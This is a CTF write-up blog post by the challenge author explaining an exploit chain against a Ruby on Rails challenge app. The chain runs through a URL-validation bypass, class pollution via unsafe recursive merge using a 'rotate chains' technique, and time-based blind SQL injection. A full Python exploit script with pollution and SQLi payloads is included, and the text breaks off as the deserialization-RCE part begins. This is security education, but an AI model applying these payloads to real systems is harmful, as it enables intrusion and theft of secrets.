---
title: 'Ruby class pollution research - Rotate Chains'
pubDate: 2025-08-29
description: 'Abusing ruby class pollution via a new method called rotate chains to get SQLI and then exploiting a 1-gadget ruby deserialization gadget to get RCE.'
author: 'Winters0x64'
layout: '../../layouts/MDLayout.astro'
tags: ["Ruby","Class Pollution","SQLI","Deserialization"]
---

## Introduction

For this year's bi0sCTF I made a Ruby-based server-side challenge. In order to solve the challenge, players had to find a unique method to exploit class pollution in Ruby. I’m terming this method Rotate Chains (Sounds Cool Right?…). Using this new method, exploiting class pollution in Ruby can be made super efficient and reliable. I’ll talk more about this method going forward. There is a second part to this challenge after the class pollution part, which is the one-gadget Ruby deserialization part, where players need to exploit an already known quirk in Ruby in a clever way and finally get RCE to get the flag and solve the challenge. So let's jump to the challenge without wasting any time.

![meme_1](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/meme_1.jpg)

## Challenge setup

So this challenge has two parts, so I'll give a little context here. SFS is supposed to be a company. They used to use one legacy file-storing service, which is one of the services in the challenge called the ``legacy`` service, which they replaced because of some vulnerability 👀, and now they are using a new service for securely storing files. This is called the ``core`` service in the challenge setup, as evident from the docker-compose file.  
 
Now, since the ``legacy`` service is out of service, it's not exposed outside the docker container. Players can only access the ``core`` service via the network, and we can see from the Dockerfile for the ``legacy`` service that the flag is stored in this service. So in order to get the flag, we somehow have to communicate with the ``legacy`` service via the ``core`` service, which makes up the first part of the challenge, and then we'll move on to the second part of the challenge.  

## Polluting the classes and leaking secrets(First Part: Exploiting the core service)

So continuing from the previous paragraph, we have to find some way to interact with the ``legacy`` service from the ``core`` service, so let's take a look through the Rails source code in the ``core`` service. We can see there is a file called ``legacy_controller.rb`` in the controllers directory of the Rails application (Check out: https://github.com/teambi0s/bi0sCTF/blob/main/2025/WEB/SFS_V1/admin/src/core/src/app/controllers/legacy_controller.rb).

Now we can see from reading the source code that we can send a file to the ``legacy`` endpoint via this endpoint, like we wanted, but there are some checks that we need to bypass before we access this endpoint, those being:

```rb
def require_validated
    return unless session[:user_id]
    unless current_user&.validated
      flash[:error] = "Access denied: User not validated"
      redirect_to settings_path
    end
  end

  def require_legacy_cookie
    unless cookies[:Legacy] == "b7kjnbpb4t"
      flash[:error] = "Access denied: Invalid or missing Legacy cookie"
      redirect_to settings_path
    end
  end
```

So in order to access this endpoint, our user needs to be validated, and while making the request to this endpoint we have to send a cookie called ``Legacy`` which should have the value ``b7kjnbpb4t``. Hmm, so right now we have two obstacles to tackle: first we need to figure out how we can make our account verified, and second we need to figure out the value of the ``Legacy`` cookie, as in the handout given to the CTF players it's a different value and on the server it's a different value. First, let's make our user account verified, then we'll move on to getting the ``Legacy`` cookie.  
 
### Getting our user validated

So let's see how the verification system actually works in SFS. Checking out the register endpoint, we can see that there is a field for putting a username and a URL, as you can see from the following image.  

![register_page](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/sfs_2.png)

alright let's what's going on in the backend with the url part

```ruby
...
...
def register
    if request.get?
      render :register
    elsif request.post?
      username = params[:username]
      url = params[:url]

      if url&.downcase&.include?("localhost")
        flash[:error] = "You are not part of the internal network"
        return render :register, status: :unprocessable_entity
      end
...
...
```
As we can see, the URL that we give is checked for the string ``localhost`` in it. If such a string is present, then the registration won't proceed further and we'll see an error. Naturally, one might wonder why a check like this exists. We can find the answer to this question in the ``validate_controller.rb`` file. Let's take a look at this file.  

```rb
...
...
begin
      parsed_url = URI.parse(@user.url)
      if parsed_url.scheme != "http" && parsed_url.scheme != "https"
        flash.now[:error] = "Only http, https schemes allowed"
      elsif parsed_url.host && parsed_url.host != "localhost"
        flash.now[:error] = "Validation failed: validation is only possible if you're part of the local network"
      else
        require Rails.root.join('app/controllers/healthcheck_controller')
        if HealthcheckController.new.validate_path(@user.url, @user)
          @user.update!(validated: true)
          flash.now[:notice] = "URL validated successfully! Your account is now validated."
        else
          flash.now[:error] = "Validation failed: You must only give your personal URL"
        end
      end
    rescue URI::InvalidURIError
      flash.now[:error] = "Invalid URL format."
    end
...
...
```

Here, as you can see, the ``parsed_url`` variable contains our parsed URL (which is the URL that we gave when registering to the site). After parsing the URL, they are checking if the host part of our ``parsed_url`` exists; if it does, then it checks whether the host part is ``localhost``. If that check fails, then our account won't be validated essentially, and we won't be able to access the ``legacy`` endpoint to access the second part of the challenge. But there's a catch…  

![meme_2](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/meme_2.jpg)

So according to RFC-1738, ``http:/example.com`` is a valid URL even though there's only one ``/``. When Ruby's URL parser parses this URL, then the host part will be empty. This is because anything after the ``/`` is considered as the path part of the URL, so the host part would be empty. Here is the demo.  

```
irb(main):006> URI.parse('http://example.com').host
=> "example.com"
irb(main):007> URI.parse('http:/example.com').host
=> nil
irb(main):008>
```

so ``parsed_url.host`` will be empty, it matters here because as you can see from the source code above the check is like this 
```ruby
...
...
elsif parsed_url.host && parsed_url.host != "localhost"
...
...
```
So if ``parsed_url.host`` is empty, then the localhost check is not done and we move on with the validation logic, allowing us to bypass the restriction on the register page. We can see that before our account is validated there is one more check being done, which is ```HealthcheckController.new.validate_path```. Basically, if you see the source code, that function just verifies if the path part of the URL that we give during registration is the same as our username. So, for example, if I registered with the username ``abcd`` I should give the URL ``http:/example.com/abcd``, then my account would be validated.  

So we finally got our account validated, but we have a long way to go before solving this challenge, so let's move on to leaking the ``Legacy`` cookie to finally access the ``/legacy`` endpoint.  

### Leaking the legacy cookie

So we know that we want to leak the ``Legacy`` cookie but where is it stored? we can find the answer for that in file ``core/src/db/seeds.rb``
```
Legacy.find_or_create_by!(legacy_secret: 'b7kjnbpb4t')
```
Okay so the secret is stored in a table called ``Legacy`` in the database.

Rails uses ``ActiveRecord`` as its ORM so SQLIs are out of the question but still unsafe coding using ORMs can still lead to SQLI an example for this can be found in the file ``healthcheck_controller.rb``.
```ruby
@@admin_username = "admin"
@@admin_url = "http://localhost:3000"
def self.admin_username
  @@admin_username
end

def self.admin_url
  @@admin_url
end

def index
  admin_exists = User.where("username = '#{HealthcheckController.admin_username}'")
  if admin_exists.size != 0 
    begin
      uri = URI.parse(HealthcheckController.admin_url)
      if uri.hostname == "localhost"
        response = Net::HTTP.get_response(uri)
        if response.is_a?(Net::HTTPSuccess) 
          puts "Everythings working and the system is up"
        else
          puts "!!!!System is still booting!!!!"
        end
      else
        puts "!!!!Corrupt url!!!!"
      end
    rescue StandardError => e
      puts e
    end
  else
    puts "!!!!Admin user not loaded, need to restart the service!!!!"
  end

  head :ok
end
```

On first glance, everything looks secure. I mean, this line ``admin_exists = User.where("username = '#{HealthcheckController.admin_username}'")`` is vulnerable to SQLI only if ``HealthcheckController.admin_username`` is controllable by us. Now, this variable is hardcoded in the code itself, as you can see: ``@@admin_username = "admin"`` at the top of the file.  

So the plan is to get SQLI, and the only place to get SQLI seems to be in the above code, but we don't have any control over the variable passed to the vulnerable SQL implementation. But.........  

![meme_3](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/meme_3.jpeg)

Well well well we can actually control the ``@@admin_username``, let me explain how in the following section.

### Class pollution to control variables

#### Diving into ruby class pollution

Some awesome folks at doyensec at already wrote  a blog on ruby class pollution, Please read it to find more: https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html.

I'm just gonna give a small intro to class pollution in ruby.

Before that here's an intro into what the ``recursive_merge`` does
 So consider this object in ruby 
```ruby
a = {
  "user" => {
    "profile" => {
      "name" => "Alice",
      "age" => 25
    }
  }
}
```
and 
```ruby
b = {
  "user" => {
    "profile" => {
      "age" => 30,
      "email" => "alice@example.com"
    }
  }
}
```
and if we do ``a.recursive_merge(b)`` we should get 
```ruby
{
  "user" => {
    "profile" => {
      "name" => "Alice",
      "age" => 30,
      "email" => "alice@example.com"
    }
  }
}
```
So essentially by recursively merging we can get combine to objects recursively to give a Union of the two objects.

Now Consider the following code snippet
```ruby
class Person
  @@url = "http://default-url.com"

  attr_accessor :name, :age, :details

  def initialize(name:, age:, details:)
    @name = name
    @age = age
    @details = details
  end

  def self.url
    @@url
  end

  def merge_with(additional)
    recursive_merge(self, additional)
  end

  private

  def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|
      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
    original
  end
end

class User < Person
  def initialize(name:, age:, details:)
    super(name: name, age: age, details: details)
  end
end

user = User.new(
  name: "John Doe",
  age: 30,
    details: {
      "occupation" => "Engineer",
      "location" => {
        "city" => "Madrid",
        "country" => "Spain"
    }
  }
)

class KeySigner
  @@signing_key = "default-signing-key"

  def self.signing_key
    @@signing_key
  end

  def sign(signing_key, data)
    "#{data}-signed-with-#{signing_key}"
  end
end


puts "KeySigner key before pollution: " + KeySigner.signing_key

for i in 1..100
  user.merge_with({
    "class" => {
      "superclass" => {
        "superclass" => {
          "subclasses" => {
            "sample" => {
              "signing_key" => "injected-signing-key"
            }
          }
        }
      }
    }
  })
end

puts "KeySigner key after pollution: " + KeySigner.signing_key
```

So in the above implementation we have a ``Person`` class which has a recursive merging function called ``recursive_merge``, this function works on any class objects rather than just Hashes(Hashes are kind of the dictionary data structure in ruby).

Now lets run the above file and see what happens 
![output_1](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/sfs_output_1.png)

So what's going here?

I'll explain the entire thing by explaining what this line does
```ruby
user.merge_with({
    "class" => {
      "superclass" => {
        "superclass" => {
          "subclasses" => {
            "sample" => {
              "signing_key" => "injected-signing-key"
            }
          }
        }
      }
    }
  })
```

Our objective is simple: we need to pollute the ``signing_key`` of the ``KeySigner`` class to our own value.

So we know that `user` is a child class of the `Person` class, so when we do ``user.class`` we'll get the ``User`` class, and when we do ``user.class.superclass`` we'll get the ``Person`` class as the output. Now when we do ``user.class.superclass.superclass`` we get the output as the ``Object`` class. This ``Object`` class is kind of like the mother of all classes in Ruby; every class that you create will be a child of this ``Object`` class. After that we can call the ``subclasses`` function on this ``Object`` class to get all the direct child classes of this ``Object`` class, i.e. ``Object.subclasses``, which is the same as calling ``user.class.superclass.superclass.subclasses``. In this way we'll get all the subclasses of the ``Object`` class; the ``subclasses`` function would return all the subclasses in an array object.

Alright, up until now what we have done is we have traced back to the ``Object`` class and got all of its subclasses by chaining ``class``, ``superclass``, and ``subclasses``. Now in this subclasses array our user-defined class would also be there since everything will be a subclass of the ``Object`` class. Now we need to find the ``KeySigner`` class from this array of subclasses in order to pollute it — this is where the ``sample`` function comes into play. The ``sample`` function in Ruby returns a random element from an array, so in this context we are using the ``sample`` function to return a random class from the subclasses array, and then on the random class that is returned by ``sample`` we are trying to modify the ``signing_key`` value to ``"injected-signing-key"``.

So ideally this is what we are trying to achieve using the sample function: ``user.class.superclass.superclass.subclasses[0].signing_key="injected-signing-key"``. When recursively merging, we can't give bracket notation to retrieve the class we want. In recursively merging, we can only call functions defined on the object without any function arguments, so ``subclasses[0]`` is not possible. This is where ``sample`` comes into play, since ``sample`` is a function and returns a random element in the subclasses array without taking any function arguments.

So one question that could arise here is: what if ``sample`` returns a different class rather than the class that we want to pollute? This is possible since ``sample`` returns a random element from the array. In order to make this work, we can only call the ``sample`` function multiple times and hope it returns the correct class to pollute in one of these attempts. So that's exactly what we are doing in the above code snippet.  

```ruby
for i in 1..100
  user.merge_with({
    "class" => {
      "superclass" => {
        "superclass" => {
          "subclasses" => {
            "sample" => {
              "signing_key" => "injected-signing-key"
            }
          }
        }
      }
    }
  })
end
```

I'll trace the step-by-step execution of the above snippet. First, the ``recursive_merge`` function sees the ``class`` function and executes ``user.class``, returning the ``User`` object. Now it sees the ``superclass`` function and it executes that against ``user.class.superclass``, which, like we discussed above, returns the ``Person`` class. Now the ``recursive_merge`` function sees the next ``superclass`` function and it calls ``user.class.superclass.superclass``, which returns the ``Object`` class. Moving on, it sees the ``subclasses`` key and it calls ``user.class.superclass.superclass.subclasses``, and this returns a huge list of subclasses of ``Object``. On this returned array the ``recursive_merge`` function calls the ``sample`` function, which returns some random class in the array, and then on the returned class the ``recursive_merge`` function tries to modify the ``signing_key`` class variable, which could lead to a successful pollution or a total failure. The chances of success depend on ``sample`` returning the correct class that we want to pollute; it's unpredictable since it's random. Hence that is the reason why we need to call it inside the ``for`` loop, so that in one of the iterations ``sample`` would return the correct class to pollute and our pollution succeeds.  

### Going back to our challenge and framing an attack strategy.

Alright so now we know about class pollution in ruby lets see if we can find an exploitation pathway in our challenge application and leak the legacy cook  ie.

There is an interesting endpoint that we haven't discussed yet that is the ``/settings`` endpoint. 

![settings_endpoint](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/sfs_3.png)

Now lets take a look at an interesting part of its source code.

```ruby
...
...
 @user = User.find(session[:user_id])
    @settings = @user.setting || Setting.new(user: @user)
...
...
  elsif request.post?
      unless settings_params[:file].present? && settings_params[:json_data].present?
        flash[:error] = "Both file and JSON settings are required"
        return render :settings, status: :unprocessable_entity
      end

      begin
        user_settings = JSON.parse(settings_params[:json_data], max_nesting: 150)
        added_settings = Utils::Add.adder(@settings, user_settings)
...
...
 # After a few lines
 File.open(final_path, "wb") do |file|
          file.write(settings_params[:file].read)
        end
...
...
```

The file that we uploaded gets saved to a location on the disk after performing some basic checks on the file and file name.

Alright, from the above code snippet we can see that this endpoint takes a file and a JSON object with the POST request. The JSON we give is stored in a variable called ``user_settings``, and we can see that it’s being passed to a function like this:  
``Utils::Add.adder(@settings, user_settings)``.  

Before explaining that function, let’s see where the ``@settings`` variable comes from. We can see from the above code snippet that it first checks if our session has a settings object defined; if not, it initiates a new settings object for us. This settings object is an ``ActiveRecord`` subclass (``ActiveRecord`` is used to handle database operations for Rails, basically it is the ORM of Rails).  

So here is the settings endpoint’s implementation:  

```ruby
class Setting < ApplicationRecord
  belongs_to :user

  validates :user_id, uniqueness: true
  validates :file_path, presence: true, allow_nil: true

  def initialize(attributes = nil)
    super
    @isolated = false if isolated.nil?
    @random = false if random.nil?
    @extension = false if extension.nil?
  end
end
```
Here you can see that this class has three variables which needs to passed to the constructor when initiating the object.

Alright so coming back, the json we send in the POST request is passed to a function called ``adder`` along with this settings object. Alright now its time to take a look at what the ``adder`` does with these two objects.

This is ``adder`` function's source code
```ruby
module Utils
  module Add
    def self.adder(original, additional, current_obj = original)
      additional.each do |key, value|
        if value.is_a?(Hash)
          if current_obj.respond_to?(key)
            next_obj = current_obj.public_send(key)
            adder(original, value, next_obj)
          else
            new_object = Object.new
            current_obj.instance_variable_set("@#{key}", new_object)
            current_obj.singleton_class.attr_accessor key
          end
        else
          current_obj.instance_variable_set("@#{key}", value)
          current_obj.singleton_class.attr_accessor key
        end
      end
      original
    end
  end
end
```

Hmm, Have you seen this function anywhere else???

![meme_3.1](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/meme_3.jpg)

Yes, the above function is same as the ``recursive_merge`` function that we talked about a few paragraphs back, so this function just takes the settings object defined in the server and it also takes the user given json object and then just recursively merges them to crate a Union of the two objects just like we talked about, Now just like how we talked this function earlier, It's vulnerable to class pollution.

#### What we are trying to achieve
Okay, so now we have an injection point in the ``/settings``, and our end goal is to use this class pollution vector to change the ``admin_username`` and ``admin_url`` in the ``HealthcheckController`` class. This is very similar to what we have discussed in the class pollution part; using class pollution we need to change the ``admin_url`` to ``http://localhost:3000/qwe``. This step is important because if you check out the file ``profile_controller``, whenever we do ``http://localhost:3000/username`` the logic in ``profile_controller`` gets activated, as evident from the ``routes.rb`` file.

```ruby
get ':username', to: 'profile#show', constraints: { username: /[^\/]+/ }
```

Alright lets take a look at the logic of ``profile_controller`` now.
```ruby
class ProfileController < ApplicationController
  def show
    # Timeout to prevent overloading the server
    start_time = Time.now
    while Time.now - start_time < 5 
    end
    user = User.find_by(username: params[:username])
    if user
      render json: {
        username: user.username,
        url: user.url,
        validated: user.validated
      }, status: :ok
    else
      render json: { error: "User not found" }, status: :not_found
    end
  end
end
```
As you can see from the line 
```ruby
start_time = Time.now
    while Time.now - start_time < 5 
    end
```
This endpoint takes 5 seconds to load whenever we try to access it, so basically whenever we load ``http://localhost:3000/any_username`` it will take 5 seconds to respond. By default, ``admin_url`` is set to ``http://localhost:3000``, which means it loads instantly. Polluting the ``admin_url`` is important, and the following paragraph will make it clear why this step is necessary.

Alright, so let’s take a look at the ``HealthcheckController`` controller’s logic again.

```ruby
...
...
admin_exists = User.where("username = '#{HealthcheckController.admin_username}'")
    if admin_exists.size != 0 
      begin
        uri = URI.parse(HealthcheckController.admin_url)
        if uri.hostname == "localhost"
          response = Net::HTTP.get_response(uri)
          if response.is_a?(Net::HTTPSuccess) 
            puts "Everythings working and the system is up"
...
...
```

So if we pollute the class variable ``HealthcheckController.admin_username`` with some SQLI payload (since we know there is SQLI in the ``User.where`` call in this file), we need the result to be reflected somewhere. But as you can see from the source, the result is not reflected anywhere. After the ``User.where`` call, it will just send a request to ``admin_url``. So we need to do a time-based blind SQLI attack here.  

So here's the idea: we pollute ``admin_username`` to ``' OR (SELECT EXISTS (SELECT 1 FROM legacies WHERE legacy_secret LIKE 'L%'))) --``. We check if the secret starts with `L`. If our guess is correct, then the `if` condition in the code will match, and a request will be sent to ``admin_url``. Since we polluted ``admin_url`` to ``http://localhost:3000/qwe``, the request would take 5 seconds to load because of the logic in the ``profile_controller``. And there you go—we have a proper time-based SQLI oracle here.  

We can cycle through different character guesses in the ``LIKE`` statement and see if it takes 5 seconds to load. If it takes 5 seconds to load, then our guess is correct; if it loads instantly, that means our guess is wrong, and we move on to the next character.  

So what we are trying to achieve is pretty straightforward: use the class pollution vector in the ``/settings`` endpoint to pollute the ``admin_url`` and ``admin_username`` in the ``/health`` endpoint so that we can use the logic in ``/profile_controller`` to create a time-based SQLI oracle for the SQL injection that we can get through polluting the ``admin_username`` variable. Thus, in the end, we can use time-based SQLI to leak all the characters of the ``legacy`` secret.  

### Things are not as easy as it seems: Polluting the variables in HealthcheckController

Before I explain why polluting the ``admin_username`` and ``admin_url`` in ``/health`` is hard using the traditional class pollution method with ``sample`` as explained above, we first need to understand the Ruby Object Space.  

So, Ruby Object Space is the space containing all the classes that were initialized as part of Ruby itself and any other user-created classes and their subclasses. When a huge framework like Rails is used in a project, it introduces a lot of new classes and subclasses on top of the traditional classes that load as part of the standard Ruby initialization process.  

Now, let’s take a look at where we are when we start polluting, so that we can trace back to the root Object. We also need to know where the ``HealthcheckController`` class is so that we can pollute it. So here’s a diagram to explain it better.  

![sfs_diag](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/sfs_diag.png)  

The diagram shows the inheritance chain, and it shows where the user-defined controllers are stored (which we need to pollute) and where we start from, which is essentially our starting injection point.  

So, we can see that we need to climb the inheritance chain like the following using class pollution.  

``Object_Instance => Setting => ApplicationRecord => ActiveRecord::Base => Object`` 

Now after reaching ``Object`` we need to descent into the class that we want to pollute like so 

``
Object=>AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_url
``

Now after reaching ``Object`` we need to descend into the class that we want to pollute like so  

``  
Object => AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_url  
``  

Now, in the example of class pollution that we discussed earlier, we called ``sample`` multiple times and hoped it would pollute the class that we want. But in this challenge, we use Rails along with many other user-defined classes, subclasses, etc. So relying on ``sample`` is not effective and would take a long time, as ``sample`` might return the correct class, but even then it needs to get the subclass of the class correct. That means with every subclass, the probability of ``sample`` returning the correct class to pollute is close to 0. This makes traversing to ``Object => AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_url`` almost impossible using the ``sample`` method because of the number of subclasses.  

So it seems like we hit a stone wall. While making the challenge, I had to find a new way to exploit class pollution in Ruby, so...  

### The Rotate Chains

![rotate_chains_intro](https://raw.githubusercontent.com/winters0x64/Win95/refs/heads/main/meme_4.jpeg)

Lets take an array in ruby, checkout the screenshot below
![array_rotate](https://raw.githubusercontent.com/winters0x64/gsm-128/refs/heads/main/Screenshot%202025-08-18%20203539.png)

So as you can see if you have an array then you can use the rotate method on that array, so when you call rotate on an array the array elements shifts to the left essentially the first element becomes the last, sort of like a cycle as you can see from the screenshot above.

So when we use this payload 
```ruby
{"class":{"superclass":{"superclass":{"superclass":{"subclasses":{"first":{"some_key":"somevalue"}}}}}}}
```
The backend parses this JSON using the vulnerable ``Utils::Add.adder`` function. It actually traverses backwards through the inheritance chain, and finally we reach the Object class. So in this challenge, we are going backwards like this: ``Object_Instance => Setting => ApplicationRecord => ActiveRecord::Base => Object``.  

Finally, we call the ``subclasses`` method on this ``Object`` instance that we reached, and we get an array of all the classes loaded in Ruby Object Space. Since this challenge uses a lot of libraries such as Rails and related classes, the Object Space will be filled with such classes, meaning that the ``subclasses`` call would return a huge array filled with the loaded classes.  

(In the example above, calling ``first`` would just return the first class inside the subclasses list, which is the class that got loaded last. Then I’m just assigning a random key and value there, nothing important in this part.)  

Now, for the sake of explanation, let’s assume that the subclasses of Object are ``class A``, ``class B``, ``class C``, and ``class D``. Now assume that the class we want to pollute is nested inside ``class C``, so let’s take it to be ``class C`` -> ``class CB`` -> ``class CBC``. This means that the class we want to pollute is ``class CBC``. And now assume that each of the classes has a lot of subclasses.  

So the traditional method of using the ``sample`` function won’t work, since getting the right sequence of classes to pollute is really slim, as there are many nested subclasses. Now, the ``rotate`` method is really simple. Instead of ``sample``, we’ll call ``rotate`` on the ``subclasses`` array.  

So, initially our subclasses array looked like this: ``["class A","class B","class C","class D"]``. Let’s call ``rotate`` on it, and it becomes ``["class B","class C","class D","class A"]``. Alright, now let’s call ``rotate`` again on this subclasses array. Now it becomes ``["class C","class D","class A","class B"]``. As we can see, ``class C`` is now the first element in the subclasses array. Now we call the function ``first`` on it, and we’ll get back ``class C``.  

Next, we call the ``subclasses`` function again on this returned ``class C`` object, and we’ll get the subclasses of it. Let’s assume that ``class C`` has the following subclasses: ``["class CA","class CB","class CC"]``. From our discussion earlier, we know that we want ``class CB`` to be first in the array so that we can use it to get to ``class CBC`` (the class we want to pollute). Calling ``rotate`` on this array yields ``["class CB","class CC","class CA"]``. Just like before, we call ``first`` on it and get back ``class CB``.  

Now, again like last time, we call the ``subclasses`` function on this and get back the following array: ``["class CBA","class CBB","class CBC"]``. Calling ``rotate`` on it gives us ``["class CBB","class CBC","class CBA"]``. Calling ``rotate`` again gives us ``["class CBC","class CBA","class CBB"]``. Now we are very close to our target. Calling ``first`` here gives us back ``class CBC``, which is exactly the class we want to pollute.  

Thereafter, we can just change any variables we want inside the class, hence executing a successful pollution. This method is precise and will ensure 100% exploit success, since unlike the ``sample`` method, we are reducing the number of brute-forces significantly by making sure that the class we try to exploit goes back in the array list once the exploitation fails for that class. After *n* number of rotates, the class we want to pollute will appear first in the array, and we’ll be able to pollute our required class.  

Wphew, that was a lot... now let’s see how we can apply that to our scenario. The class we want to pollute is in this chain:  

``Object => AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_url``  

Just like we discussed above, we just have to keep calling ``rotate`` until ``AbstractController::Base`` comes first in the subclasses array of ``Object``. Then we can call ``first`` to get ``AbstractController::Base``. After that, we call ``subclasses`` to get ``[ActionController::Metal]`` (since ``AbstractController::Base`` has only a single subclass).  

Now, we call ``first`` again to get back the class ``ActionController::Metal``. Then we call ``subclasses`` and get ``[ActionController::Base]`` (again, it only has one subclass). We call ``first`` here to get back ``ActionController::Base``. On it, we call ``subclasses`` again to get ``[ApplicationController]``.  

Next, we call ``first`` to get back ``ApplicationController``, and again we call ``subclasses`` on it to get back ``[HealthcheckController]``. Finally, we call ``first`` to get back ``HealthcheckController``, which is the class that we want to pollute. From here, we can just change whatever class variables we want in the class.  
 
And here is the exploit script to solve the first part of the challenge
(There are many ways to use the SQLI to leak the cookie and can be optimised further)
```py
import requests
import random
import time
import json
import string

BASE_URL = "http://localhost:3000/"
 
def log(msg):
    print("")
    print("#### [Log]: ####"+ msg)
    print("")

def register() -> str:
    # Generate random printable username
    username = ''.join(random.choices("abcdefghijklmnopqrstuvxyz", k=10))
    log(f"Generated username: {username}")
    url = 'https:/winters0x64.xyz/'+username # Constraint to set validation as true.
    data = {
        'username': username,
        'url': url,
        'commit': 'Register'
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(BASE_URL + 'register', headers=headers, data=data)
    set_cookie = response.headers.get('Set-Cookie', '')
    for part in set_cookie.split(';'):
        if part.strip().startswith('_sfs_session='):
            print("Session Cookie: ",part.strip())
            return part.strip()
    log("Registration Error")
    return None


def validate(sess_cookie:str):
    # Used to load the HealthCheck class to ObjectSpace as the latest additon to ApplicationController subclasses
    headers = {
        'Cookie': sess_cookie,
    }
    res = requests.get(BASE_URL+'validate', headers=headers)

def visit_settings(sess_cookie:str):
    headers = {
        'Cookie': sess_cookie,
    }
    requests.get(BASE_URL+'settings', headers=headers)


def send_file_with_json(pollute_object, file_path, sess_cookie):
    try:
        if isinstance(pollute_object, dict):
            json_data = json.dumps(pollute_object)
        else:
            json_data = json.dumps(pollute_object) if pollute_object else "{}"
            json.loads(json_data)  
    except (ValueError, TypeError) as e:
        log(f"Invalid JSON for pollute_object: {e}")
        return None

    with open(file_path, 'rb') as f:
        files = {
            'file': f
        }
        data = {
            'json_data': json_data
        }
        headers = {
            'Cookie': sess_cookie,
        }

        response = requests.post(BASE_URL + 'settings', files=files, data=data, headers=headers)
        return response


def pollute_admin_url(sess_cookie:str):
    # Unique identification chain
    # AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_url
    final_walk = {"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"admin_url":"http://localhost:3000/qwe"}}}}}}}}}}

    rotate_chains = {"rotate":final_walk}

    # Object_Instance => Setting => ApplicationRecord => ActiveRecord::Base => Object
    pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

    # Start the chains
    for i in range(100):
        log(f"Trying {i} rotates")
        res = send_file_with_json(pollute_object,'load_command.rb',sess_cookie)
        rotate_chains = {"rotate":rotate_chains}
        pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

def pollute_admin_username(sess_cookie:str, to_test:str):
    # Unique identification chain
    # AbstractController::Base => ActionController::Metal => ActionController::Base => ApplicationController => HealthcheckController => admin_username
    final_walk = {"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"subclasses":{"first":{"admin_username":f"' OR (SELECT EXISTS ( SELECT 1 FROM legacies WHERE legacy_secret LIKE '{to_test}%'))) --"}}}}}}}}}}

    rotate_chains = {"rotate":final_walk}

    # Object_Instance => Setting => ApplicationRecord => ActiveRecord::Base => Object
    pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

    # Start the chains
    for i in range(100):
        log(f"Trying {i} rotates")
        res = send_file_with_json(pollute_object,'load_command.rb',sess_cookie)
        rotate_chains = {"rotate":rotate_chains}
        pollute_object = {"class":{"superclass":{"superclass":{"superclass":{"subclasses":rotate_chains}}}}}

def exploit_sqli(sess_cookie:str):
    to_test = "fake_"
    leaked = ""
    log("Polluting admin_username")
    pollute_admin_username(sess_cookie, to_test)
    start_time = time.time()
    response = requests.get(BASE_URL+'health')
    end_time = time.time()
    duration = end_time - start_time
    if duration > 2:
        leaked = to_test
        log("Leaked: "+to_test)
    else:
        log("Not Found")
    return leaked

if __name__ == "__main__":
    sess_cookie = register()
    log("Registration successful...")
    #1 After registration => [RegisterController]
    visit_settings(sess_cookie)
    log("Visiting settings controller successful...")
    #2 After visiting settings controller [SettingsController, RegisterController]
    validate(sess_cookie)
    log("Visiting validate controller successful...")
    #3 After validating [HealthcheckController, ValidateController, SettingsController, RegisterController]
    time.sleep(1)
    # Starting class pollution
    log("Polluting admin_url")
    pollute_admin_url(sess_cookie)
    # Starting class pollution + SQLI
    legacy_cookie = exploit_sqli(sess_cookie)
    print("Leaked Cookie: "+ legacy_cookie)
```

Alright and by running the above script we'll be able to leak the ``Legacy`` cookie which we needed to access the ``/legacy`` endpoint, And with that we have used the rotate chains method to exploit the class pollution vulnerability in this application to target our victim class and successfuly pollute it.

Now lets move on to the second part of this challenge.......

![second_part](https://raw.githubusercontent.com/winters0x64/gsm-128/refs/heads/main/a49fzr.jpg)


## Popping SHELLz (Second Part: Exploiting a 1-gadget unsafe deserialization in ruby to achieve RCE)

Alright now that we can access the ``legacy`` endpoint, as our user is verified and also we have leaked the ``Legacy`` cookie using the rotate chains method that I described above. Alright now lets take a look at the source code of this legacy endpoint.
```ruby
....
....
 def index
    @user = current_user
    
    if request.post?
      file_path = @user.setting.file_path
      user_string = params[:string] || ''
      user_key = params[:key] || ''
      
      begin
        uri = URI('http://legacy:3001')
        http = Net::HTTP.new(uri.host, uri.port)
        request = Net::HTTP::Post.new(uri.path.empty? ? '/' : uri.path)
        
        boundary = "RubyFormBoundary#{SecureRandom.hex(10)}"
        request.content_type = "multipart/form-data; boundary=#{boundary}"
        
        body = []
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"file\"; filename=\"#{File.basename(file_path)}\"\r\n"
        body << "Content-Type: application/octet-stream\r\n"
        body << "\r\n"
        body << File.read(file_path, mode: 'rb')
        body << "\r\n"
        
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"string\"\r\n"
        body << "\r\n"
        body << user_string
        body << "\r\n"
        
        body << "--#{boundary}\r\n"
        body << "Content-Disposition: form-data; name=\"key\"\r\n"
        body << "\r\n"
